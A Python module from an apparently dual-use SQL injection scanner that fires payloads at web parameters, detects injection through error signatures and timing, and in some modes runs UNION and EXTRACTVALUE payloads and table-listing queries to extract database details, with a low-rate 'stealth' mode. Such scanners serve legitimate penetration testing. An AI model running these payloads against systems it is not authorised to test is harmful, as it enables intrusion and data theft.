"""
ReconScan Professional SQL Injection Scanner

Comprehensive SQL injection detection, analysis, and exploitation system.
Integrates payload crafting, response analysis, vulnerability validation, and data extraction.
"""

import asyncio
import aiohttp
import time
import statistics
import re
import hashlib
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import dataclass
from enum import Enum

from .sql_payload_crafting_engine import (
    PayloadCraftingEngine,
    PayloadCraftingContext,
    InjectionTechnique,
    DatabaseType as CraftingDatabaseType
)
from ...shared.injection_discovery import InjectionPoint, ParameterType
from scanner.ai import AIVulnerabilityValidator

# Color definitions for consistent CLI output
BLUE = '\033[94m'
GREEN = '\033[1;38;5;28m'  # Bold forest green
YELLOW = '\033[93m'
RED = '\033[91m'
CYAN = '\033[96m'
ENDC = '\033[0m'  # End color

class DetectionTechnique(Enum):
    """SQL injection detection techniques."""
    BOOLEAN_BLIND = "boolean_blind"
    ERROR_BASED = "error_based"
    TIME_BASED = "time_based"
    UNION_BASED = "union_based"
    STACKED_QUERIES = "stacked_queries"

class DatabaseType(Enum):
    """Supported database types for fingerprinting."""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    UNKNOWN = "unknown"

class ScanMode(Enum):
    """SQL injection scanning modes."""
    FAST = "fast"
    THOROUGH = "thorough"
    STEALTH = "stealth"
    AGGRESSIVE = "aggressive"

@dataclass
class VulnerabilityFinding:
    """Comprehensive vulnerability finding result."""
    injection_point: InjectionPoint
    technique: DetectionTechnique
    database_type: Optional[DatabaseType]
    confidence: float
    evidence: List[str]
    payload_used: str
    exploitation_potential: str
    risk_level: str
    validation_passed: bool
    extracted_data: Optional[str]
    scan_metadata: Dict[str, Any]

@dataclass
class ScanConfiguration:
    """Configuration for SQL injection scanning."""
    mode: ScanMode
    max_payloads_per_technique: int
    timeout: float
    delay_between_requests: float
    validation_enabled: bool
    confidence_threshold: float
    max_concurrent_requests: int
    enable_exploitation: bool
    ai_validation: bool

class SQLInjectionScanner:
    """Professional SQL injection scanner with advanced detection capabilities."""
    
    def __init__(self, session: aiohttp.ClientSession, ai_validator=None):
        """Initialize the SQL injection scanner."""
        self.session = session
        self.payload_engine = PayloadCraftingEngine()
        self.ai_validator = ai_validator or AIVulnerabilityValidator()
        
        # Scan statistics
        self.scan_stats = {
            'total_requests': 0,
            'vulnerabilities_found': 0,
            'techniques_used': set(),
            'scan_duration': 0.0
        }
        
        # Database error patterns for fingerprinting
        self.error_patterns = {
            DatabaseType.MYSQL: [
                r"You have an error in your SQL syntax",
                r"mysql_fetch_array\(\)",
                r"mysql_fetch_assoc\(\)",
                r"Warning.*mysql_.*",
                r"MySQLSyntaxErrorException",
                r"Column count doesn't match",
                r"Unknown column"
            ],
            DatabaseType.POSTGRESQL: [
                r"PostgreSQL.*ERROR",
                r"Warning.*pg_.*",
                r"PG::SyntaxError",
                r"org\.postgresql\.util\.PSQLException",
                r"ERROR:\s*syntax error at or near",
                r"ERROR:\s*relation.*does not exist"
            ],
            DatabaseType.MSSQL: [
                r"Driver.*SQL[\-\_\ ]*Server",
                r"OLE DB.*SQL Server",
                r"Warning.*mssql_.*",
                r"Microsoft SQL Native Client error",
                r"Unclosed quotation mark after the character string",
                r"Incorrect syntax near"
            ],
            DatabaseType.ORACLE: [
                r"(\W|\A)ORA-[0-9]{1,4}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*\Woci_.*",
                r"quoted string not properly terminated"
            ],
            DatabaseType.SQLITE: [
                r"SQLite/JDBCDriver",
                r"SQLite.Exception",
                r"Warning.*sqlite_.*",
                r"\[SQLITE_ERROR\]",
                r"sqlite3.OperationalError:",
                r"no such table:"
            ]
        }
        
        # Predefined scan configurations
        self.scan_configs = {
            ScanMode.FAST: ScanConfiguration(
                mode=ScanMode.FAST,
                max_payloads_per_technique=3,
                timeout=5.0,
                delay_between_requests=0.1,
                validation_enabled=False,
                confidence_threshold=0.6,
                max_concurrent_requests=5,
                enable_exploitation=False,
                ai_validation=True
            ),
            ScanMode.THOROUGH: ScanConfiguration(
                mode=ScanMode.THOROUGH,
                max_payloads_per_technique=8,
                timeout=10.0,
                delay_between_requests=0.3,
                validation_enabled=True,
                confidence_threshold=0.4,
                max_concurrent_requests=3,
                enable_exploitation=True,
                ai_validation=True
            ),
            ScanMode.STEALTH: ScanConfiguration(
                mode=ScanMode.STEALTH,
                max_payloads_per_technique=5,
                timeout=15.0,
                delay_between_requests=2.0,
                validation_enabled=True,
                confidence_threshold=0.7,
                max_concurrent_requests=1,
                enable_exploitation=False,
                ai_validation=True
            ),
            ScanMode.AGGRESSIVE: ScanConfiguration(
                mode=ScanMode.AGGRESSIVE,
                max_payloads_per_technique=12,
                timeout=8.0,
                delay_between_requests=0.05,
                validation_enabled=True,
                confidence_threshold=0.3,
                max_concurrent_requests=10,
                enable_exploitation=True,
                ai_validation=True
            )
        }
        
        # Data extraction queries
        self.extraction_queries = {
            DatabaseType.MYSQL: {
                'version': "SELECT @@version",
                'user': "SELECT USER()",
                'database': "SELECT DATABASE()",
                'tables': "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 5"
            },
            DatabaseType.POSTGRESQL: {
                'version': "SELECT version()",
                'user': "SELECT current_user",
                'database': "SELECT current_database()",
                'tables': "SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 5"
            },
            DatabaseType.MSSQL: {
                'version': "SELECT @@version",
                'user': "SELECT SYSTEM_USER",
                'database': "SELECT DB_NAME()",
                'tables': "SELECT TOP 5 name FROM sysobjects WHERE xtype='U'"
            }
        }
    
    async def scan_injection_points(self, 
                                  injection_points: List[InjectionPoint],
                                  scan_mode: ScanMode = ScanMode.THOROUGH,
                                  custom_config: Optional[ScanConfiguration] = None,
                                  progress_callback: Optional[Callable] = None) -> List[VulnerabilityFinding]:
        """Scan multiple injection points for SQL injection vulnerabilities."""
        
        config = custom_config or self.scan_configs[scan_mode]
        findings = []
        scan_start = time.time()
        
        print(f"\n{BLUE}[*]{ENDC} Starting SQL Injection Scan ({scan_mode.value} mode)")
        print(f"   → Scanning {len(injection_points)} injection points")
        print(f"   → Confidence threshold: {config.confidence_threshold}")
        
        try:
            # Process injection points with concurrency control
            semaphore = asyncio.Semaphore(config.max_concurrent_requests)
            tasks = []
            
            for i, injection_point in enumerate(injection_points):
                task = asyncio.create_task(
                    self._scan_single_injection_point(injection_point, config, semaphore, i + 1)
                )
                tasks.append(task)
            
            # Process results as they complete
            for i, task in enumerate(asyncio.as_completed(tasks)):
                finding = await task
                if finding:
                    findings.append(finding)
                    print(f"   {GREEN}✓{ENDC} Vulnerability found: {finding.injection_point.name} ({finding.technique.value})")
                
                if progress_callback:
                    progress_callback(i + 1, len(injection_points), len(findings))
        
        except Exception as e:
            print(f"   {RED}[-]{ENDC} Scan error: {e}")
        
        finally:
            # Update scan statistics
            self.scan_stats['scan_duration'] = time.time() - scan_start
            self.scan_stats['vulnerabilities_found'] = len(findings)
            
            print(f"\n{CYAN}[*]{ENDC} Scan completed in {self.scan_stats['scan_duration']:.2f}s")
            print(f"   → {len(findings)} vulnerabilities found")
            print(f"   → {self.scan_stats['total_requests']} total requests sent")
        
        return findings
    
    async def _scan_single_injection_point(self, 
                                         injection_point: InjectionPoint,
                                         config: ScanConfiguration,
                                         semaphore: asyncio.Semaphore,
                                         point_number: int) -> Optional[VulnerabilityFinding]:
        """Scan a single injection point for vulnerabilities."""
        
        async with semaphore:
            try:
                print(f"   {YELLOW}[*]{ENDC} Testing injection point {point_number}: {injection_point.name}")
                
                # Create payload crafting context
                context = PayloadCraftingContext(
                    injection_point=injection_point
                )
                
                # Test each detection technique
                techniques = self._select_techniques(injection_point, config)
                best_result = None
                
                for technique in techniques:
                    print(f"      → Testing {technique.value} technique...")
                    
                    result = await self._test_technique(
                        injection_point, technique, context, config
                    )
                    
                    if result and result['vulnerable'] and result['confidence'] >= config.confidence_threshold:
                        if not best_result or result['confidence'] > best_result['confidence']:
                            best_result = result
                
                # If vulnerability found, create comprehensive finding
                if best_result:
                    # Validate if enabled
                    validation_passed = True
                    if config.validation_enabled:
                        validation_passed = await self._validate_vulnerability(
                            injection_point, best_result, context, config
                        )
                    
                    # Attempt data extraction if enabled
                    extracted_data = None
                    if config.enable_exploitation and validation_passed:
                        extracted_data = await self._attempt_data_extraction(
                            injection_point, best_result, context, config
                        )
                    
                    # Fingerprint database
                    database_type = await self._fingerprint_database(
                        injection_point, context, config
                    )
                    
                    finding = VulnerabilityFinding(
                        injection_point=injection_point,
                        technique=best_result['technique'],
                        database_type=database_type,
                        confidence=best_result['confidence'],
                        evidence=best_result['evidence'],
                        payload_used=best_result['payload'],
                        exploitation_potential=self._assess_exploitation_potential(best_result),
                        risk_level=self._calculate_risk_level(best_result, injection_point),
                        validation_passed=validation_passed,
                        extracted_data=extracted_data,
                        scan_metadata={
                            'scan_mode': config.mode.value,
                            'techniques_tested': [t.value for t in techniques],
                            'ai_validated': config.ai_validation
                        }
                    )
                    
                    return finding
                    
            except Exception as e:
                print(f"      ❌ Error scanning {injection_point.name}: {e}")
                return None
            
            finally:
                # Add delay between requests
                await asyncio.sleep(config.delay_between_requests)
        
        return None
    
    async def _test_technique(self, 
                            injection_point: InjectionPoint,
                            technique: DetectionTechnique,
                            context: PayloadCraftingContext,
                            config: ScanConfiguration) -> Optional[Dict[str, Any]]:
        """Test a specific detection technique."""
        
        try:
            # Map technique to crafting technique
            crafting_technique = self._map_to_crafting_technique(technique)
            
            # Generate payloads for this technique
            payloads = self.payload_engine.craft_payloads(
                injection_point, 
                techniques=[crafting_technique],
                max_payloads=config.max_payloads_per_technique
            )
            
            if not payloads:
                return None
            
            best_result = None
            
            # Test each payload
            for payload_data in payloads[:config.max_payloads_per_technique]:
                payload, template = payload_data
                
                # Send request with payload
                response_data = await self._send_payload_request(
                    injection_point, payload, config
                )
                
                if not response_data:
                    continue
                
                # Analyze response based on technique
                result = self._analyze_response(
                    response_data, payload, technique, injection_point
                )
                
                # AI validation if enabled
                if config.ai_validation and result['vulnerable']:
                    ai_result = self.ai_validator.validate_sql_injection(
                        injection_point.url,
                        injection_point.name,
                        payload,
                        response_data['content'],
                        response_data['headers'],
                        response_data['status_code'],
                        response_data['timing']
                    )
                    
                    if ai_result.get('is_vulnerable') is False:
                        print(f"         {BLUE}AI{ENDC} filtered false positive (confidence: {ai_result.get('confidence', 0):.2f})")
                        continue
                    
                    # Update confidence with AI assessment
                    result['confidence'] = (result['confidence'] + ai_result.get('confidence', 0.5)) / 2
                    result['evidence'].append(f"AI validation: {ai_result.get('confidence', 0):.2f}")
                
                # Track the best result
                if result['vulnerable'] and (not best_result or result['confidence'] > best_result['confidence']):
                    best_result = result
                
                # Update statistics
                self.scan_stats['total_requests'] += 1
                self.scan_stats['techniques_used'].add(technique.value)
            
            return best_result
            
        except Exception as e:
            print(f"         ❌ Error testing technique {technique.value}: {e}")
            return None
    
    def _analyze_response(self, 
                         response_data: Dict[str, Any],
                         payload: str,
                         technique: DetectionTechnique,
                         injection_point: InjectionPoint) -> Dict[str, Any]:
        """Analyze response for SQL injection indicators."""
        
        content = response_data['content']
        timing = response_data['timing']
        status_code = response_data['status_code']
        
        result = {
            'vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'technique': technique,
            'payload': payload
        }
        
        if technique == DetectionTechnique.ERROR_BASED:
            return self._analyze_error_based(content, payload, result)
        elif technique == DetectionTechnique.TIME_BASED:
            return self._analyze_time_based(timing, payload, result)
        elif technique == DetectionTechnique.BOOLEAN_BLIND:
            return self._analyze_boolean_blind(content, payload, result)
        elif technique == DetectionTechnique.UNION_BASED:
            return self._analyze_union_based(content, payload, result)
        elif technique == DetectionTechnique.STACKED_QUERIES:
            return self._analyze_stacked_queries(content, payload, result)
        
        return result
    
    def _analyze_error_based(self, content: str, payload: str, result: Dict) -> Dict:
        """Analyze response for error-based SQL injection."""
        
        # Check for database-specific errors
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    result['vulnerable'] = True
                    result['confidence'] += 0.3
                    result['evidence'].append(f"Database error detected: {pattern[:50]}...")
                    result['database_type'] = db_type
        
        # Check for generic SQL errors
        generic_patterns = [
            r'SQL syntax.*error',
            r'syntax error',
            r'unexpected.*token',
            r'division by zero',
            r'invalid.*query'
        ]
        
        for pattern in generic_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                result['vulnerable'] = True
                result['confidence'] += 0.2
                result['evidence'].append(f"SQL error pattern: {pattern}")
        
        result['confidence'] = min(result['confidence'], 1.0)
        return result
    
    def _analyze_time_based(self, timing: float, payload: str, result: Dict) -> Dict:
        """Analyze response for time-based SQL injection."""
        
        time_threshold = 3.0  # seconds
        
        if timing >= time_threshold:
            result['vulnerable'] = True
            result['evidence'].append(f"Response delay: {timing:.2f}s (threshold: {time_threshold}s)")
            
            # Calculate confidence based on delay
            if timing >= time_threshold * 2:
                result['confidence'] = 0.9
            elif timing >= time_threshold * 1.5:
                result['confidence'] = 0.7
            else:
                result['confidence'] = 0.5
            
            # Check for time-based functions in payload
            time_functions = ['sleep', 'delay', 'waitfor', 'benchmark', 'pg_sleep']
            for func in time_functions:
                if func.lower() in payload.lower():
                    result['evidence'].append(f"Time-based function used: {func}")
                    result['confidence'] += 0.1
                    break
        
        result['confidence'] = min(result['confidence'], 1.0)
        return result
    
    def _analyze_boolean_blind(self, content: str, payload: str, result: Dict) -> Dict:
        """Analyze response for boolean-based blind SQL injection."""
        
        # Simple heuristics for boolean detection
        # In real implementation, this would compare with baseline responses
        
        # Check for boolean indicators
        boolean_indicators = ['true', 'false', 'success', 'failed', 'valid', 'invalid']
        for indicator in boolean_indicators:
            if indicator.lower() in content.lower():
                result['vulnerable'] = True
                result['confidence'] += 0.2
                result['evidence'].append(f"Boolean indicator: {indicator}")
        
        # Check for conditional logic in payload
        if any(op in payload for op in ['AND', 'OR', '=', '>', '<']):
            result['confidence'] += 0.1
            result['evidence'].append("Conditional logic in payload")
        
        # Minimum confidence for boolean blind
        if result['vulnerable']:
            result['confidence'] = max(result['confidence'], 0.3)
        
        result['confidence'] = min(result['confidence'], 1.0)
        return result
    
    def _analyze_union_based(self, content: str, payload: str, result: Dict) -> Dict:
        """Analyze response for UNION-based SQL injection."""
        
        # Check for UNION indicators
        union_patterns = [
            r'union.*select',
            r'order\s+by\s+\d+',
            r'null.*null.*null',
            r'@@version',
            r'database\(\)',
            r'user\(\)'
        ]
        
        for pattern in union_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                result['vulnerable'] = True
                result['confidence'] += 0.3
                result['evidence'].append(f"UNION indicator: {pattern}")
        
        # Check for data extraction patterns
        if any(keyword in content.lower() for keyword in ['mysql', 'postgresql', 'oracle', 'sql server']):
            result['confidence'] += 0.2
            result['evidence'].append("Database information detected")
        
        result['confidence'] = min(result['confidence'], 1.0)
        return result
    
    def _analyze_stacked_queries(self, content: str, payload: str, result: Dict) -> Dict:
        """Analyze response for stacked query SQL injection."""
        
        # Check for stacked query indicators
        if ';' in payload and any(keyword in payload.lower() 
                                for keyword in ['insert', 'update', 'delete', 'create', 'drop']):
            result['evidence'].append("Stacked query payload detected")
            result['confidence'] += 0.2
        
        # Check for execution indicators
        execution_patterns = [
            r'rows? affected',
            r'command completed',
            r'query executed'
        ]
        
        for pattern in execution_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                result['vulnerable'] = True
                result['confidence'] += 0.4
                result['evidence'].append(f"Execution indicator: {pattern}")
        
        result['confidence'] = min(result['confidence'], 1.0)
        return result
    
    async def _validate_vulnerability(self, 
                                    injection_point: InjectionPoint,
                                    result: Dict[str, Any],
                                    context: PayloadCraftingContext,
                                    config: ScanConfiguration) -> bool:
        """Validate vulnerability with additional payloads."""
        
        try:
            # Generate validation payloads
            crafting_technique = self._map_to_crafting_technique(result['technique'])
            validation_payloads = self.payload_engine.craft_payloads(
                injection_point,
                techniques=[crafting_technique],
                max_payloads=3
            )
            
            successful_validations = 0
            
            # Test validation payloads
            for payload_data in validation_payloads:
                payload, template = payload_data
                
                response_data = await self._send_payload_request(
                    injection_point, payload, config
                )
                
                if response_data:
                    validation_result = self._analyze_response(
                        response_data, payload, result['technique'], injection_point
                    )
                    
                    if validation_result['vulnerable']:
                        successful_validations += 1
            
            # Require majority of validation tests to pass
            return successful_validations >= 2
            
        except Exception:
            return False
    
    async def _attempt_data_extraction(self, 
                                     injection_point: InjectionPoint,
                                     result: Dict[str, Any],
                                     context: PayloadCraftingContext,
                                     config: ScanConfiguration) -> Optional[str]:
        """Attempt to extract data from vulnerable parameter."""
        
        if result['technique'] not in [DetectionTechnique.UNION_BASED, DetectionTechnique.ERROR_BASED]:
            return None
        
        try:
            # Try to extract database version
            if result['technique'] == DetectionTechnique.UNION_BASED:
                # Simple UNION-based extraction
                union_payload = f"{injection_point.original_value} UNION SELECT @@version,NULL,NULL--"
                
                response_data = await self._send_payload_request(
                    injection_point, union_payload, config
                )
                
                if response_data:
                    content = response_data['content']
                    # Look for version information
                    version_patterns = [r'(\d+\.\d+\.\d+)', r'MySQL (\d+\.\d+)', r'PostgreSQL (\d+\.\d+)']
                    for pattern in version_patterns:
                        matches = re.findall(pattern, content)
                        if matches:
                            return f"Database version: {matches[0]}"
            
            elif result['technique'] == DetectionTechnique.ERROR_BASED:
                # Error-based extraction
                error_payload = f"{injection_point.original_value} AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e))"
                
                response_data = await self._send_payload_request(
                    injection_point, error_payload, config
                )
                
                if response_data:
                    content = response_data['content']
                    # Look for data between tildes
                    matches = re.findall(r'~([^~]+)~', content)
                    if matches:
                        return f"Extracted data: {matches[0]}"
        
        except Exception:
            pass
        
        return None
    
    async def _fingerprint_database(self, 
                                  injection_point: InjectionPoint,
                                  context: PayloadCraftingContext,
                                  config: ScanConfiguration) -> Optional[DatabaseType]:
        """Fingerprint the database type using error-based techniques."""
        
        try:
            # Generate database-specific error payloads
            error_payloads = self.payload_engine.craft_payloads(
                injection_point,
                techniques=[InjectionTechnique.ERROR_BASED],
                max_payloads=5
            )
            
            db_scores = {db_type: 0 for db_type in DatabaseType}
            
            for payload_data in error_payloads:
                payload, template = payload_data
                
                response_data = await self._send_payload_request(
                    injection_point, payload, config
                )
                
                if response_data:
                    content = response_data['content']
                    
                    # Check for database-specific patterns
                    for db_type, patterns in self.error_patterns.items():
                        for pattern in patterns:
                            if re.search(pattern, content, re.IGNORECASE):
                                db_scores[db_type] += 1
            
            # Return database type with highest score
            max_score = max(db_scores.values())
            if max_score > 0:
                for db_type, score in db_scores.items():
                    if score == max_score:
                        return db_type
                        
        except Exception:
            pass
        
        return DatabaseType.UNKNOWN
    
    async def _send_payload_request(self, 
                                  injection_point: InjectionPoint,
                                  payload: str,
                                  config: ScanConfiguration) -> Optional[Dict[str, Any]]:
        """Send HTTP request with SQL injection payload."""
        
        try:
            # Construct request based on injection point
            start_time = time.time()
            
            if injection_point.method.upper() == 'GET':
                url = f"{injection_point.url}?{injection_point.name}={payload}"
                async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=config.timeout)) as response:
                    content = await response.text()
                    timing = time.time() - start_time
                    
                    return {
                        'content': content,
                        'timing': timing,
                        'headers': dict(response.headers),
                        'status_code': response.status
                    }
            
            elif injection_point.method.upper() == 'POST':
                data = {injection_point.name: payload}
                async with self.session.post(injection_point.url, data=data, 
                                           timeout=aiohttp.ClientTimeout(total=config.timeout)) as response:
                    content = await response.text()
                    timing = time.time() - start_time
                    
                    return {
                        'content': content,
                        'timing': timing,
                        'headers': dict(response.headers),
                        'status_code': response.status
                    }
            
        except asyncio.TimeoutError:
            # Timeout might indicate time-based injection
            return {
                'content': '',
                'timing': config.timeout,
                'headers': {},
                'status_code': 408
            }
        
        except Exception:
            return None
    
    def _select_techniques(self, 
                          injection_point: InjectionPoint,
                          config: ScanConfiguration) -> List[DetectionTechnique]:
        """Select appropriate detection techniques based on context."""
        
        techniques = []
        
        # Always include error-based detection (fastest and most reliable)
        techniques.append(DetectionTechnique.ERROR_BASED)
        
        # Add boolean-based for most parameter types
        if injection_point.parameter_type in [ParameterType.NUMERIC, ParameterType.STRING]:
            techniques.append(DetectionTechnique.BOOLEAN_BLIND)
        
        # Add time-based for thorough scanning
        if config.mode in [ScanMode.THOROUGH, ScanMode.AGGRESSIVE]:
            techniques.append(DetectionTechnique.TIME_BASED)
        
        # Add UNION-based for GET parameters
        if injection_point.method.upper() == 'GET':
            techniques.append(DetectionTechnique.UNION_BASED)
        
        # Add stacked queries for aggressive scanning
        if config.mode == ScanMode.AGGRESSIVE:
            techniques.append(DetectionTechnique.STACKED_QUERIES)
        
        return techniques
    
    def _map_to_crafting_technique(self, detection_technique: DetectionTechnique) -> InjectionTechnique:
        """Map detection technique to payload crafting technique."""
        mapping = {
            DetectionTechnique.ERROR_BASED: InjectionTechnique.ERROR_BASED,
            DetectionTechnique.BOOLEAN_BLIND: InjectionTechnique.BOOLEAN_BASED,
            DetectionTechnique.TIME_BASED: InjectionTechnique.TIME_BASED,
            DetectionTechnique.UNION_BASED: InjectionTechnique.UNION_BASED,
            DetectionTechnique.STACKED_QUERIES: InjectionTechnique.STACKED_QUERIES
        }
        return mapping.get(detection_technique, InjectionTechnique.BOOLEAN_BASED)
    
    def _map_parameter_type(self, param_type: ParameterType) -> str:
        """Map injection point parameter type to crafting context type."""
        mapping = {
            ParameterType.NUMERIC: 'numeric',
            ParameterType.STRING: 'string',
            ParameterType.JSON_OBJECT: 'json',
            ParameterType.UNKNOWN: 'string'
        }
        return mapping.get(param_type, 'string')
    
    def _assess_exploitation_potential(self, result: Dict[str, Any]) -> str:
        """Assess exploitation potential based on detection result."""
        technique = result['technique']
        
        if technique == DetectionTechnique.UNION_BASED:
            return "High - Direct data extraction possible"
        elif technique == DetectionTechnique.ERROR_BASED:
            return "High - Error-based data extraction possible"
        elif technique == DetectionTechnique.BOOLEAN_BLIND:
            return "Medium - Blind data extraction possible"
        elif technique == DetectionTechnique.TIME_BASED:
            return "Medium - Time-based blind extraction possible"
        elif technique == DetectionTechnique.STACKED_QUERIES:
            return "Critical - Full database control possible"
        else:
            return "Unknown"
    
    def _calculate_risk_level(self, result: Dict[str, Any], injection_point: InjectionPoint) -> str:
        """Calculate risk level based on multiple factors."""
        base_risk = 0
        
        # Technique-based risk
        technique_risk = {
            DetectionTechnique.STACKED_QUERIES: 10,
            DetectionTechnique.UNION_BASED: 9,
            DetectionTechnique.ERROR_BASED: 8,
            DetectionTechnique.BOOLEAN_BLIND: 7,
            DetectionTechnique.TIME_BASED: 6
        }
        base_risk += technique_risk.get(result['technique'], 5)
        
        # Confidence-based risk
        base_risk += int(result['confidence'] * 5)
        
        # Parameter type risk
        if injection_point.parameter_type == ParameterType.NUMERIC:
            base_risk += 2
        
        # Method-based risk
        if injection_point.method.upper() == 'POST':
            base_risk += 1
        
        # Categorize risk
        if base_risk >= 15:
            return "Critical"
        elif base_risk >= 12:
            return "High"
        elif base_risk >= 8:
            return "Medium"
        else:
            return "Low"
    
    def get_scan_statistics(self) -> Dict[str, Any]:
        """Get comprehensive scan statistics."""
        return {
            **self.scan_stats,
            'techniques_used': list(self.scan_stats['techniques_used']),
            'requests_per_second': (
                self.scan_stats['total_requests'] / self.scan_stats['scan_duration']
                if self.scan_stats['scan_duration'] > 0 else 0
            )
        } 